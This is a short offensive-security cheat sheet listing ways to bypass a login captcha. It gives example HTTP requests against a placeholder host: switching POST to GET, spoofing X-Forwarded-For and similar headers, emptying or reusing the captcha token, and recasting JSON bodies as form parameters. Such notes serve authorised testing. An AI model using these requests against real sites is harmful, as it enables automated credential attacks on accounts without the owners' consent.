# Bypass Captcha

1. Try changing the request method, for example POST to GET
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123

GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP 1.1
Host: target.com
[...]
```
## Custom header 
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```
## Remove the value of the captcha parameter
```
POST / HTTP 1.1
Host: target.com
[...]
_RequestVerificationToken=&_Username=daffa&_Password=test123
```

## Try reuse old captcha token
```
POST / HTTP 1.1
Host: target.com
[...]
_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
```

## Convert JSON data to normal request parameter
```
POST / HTTP 1.1
Host: target.com
[...]
{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```


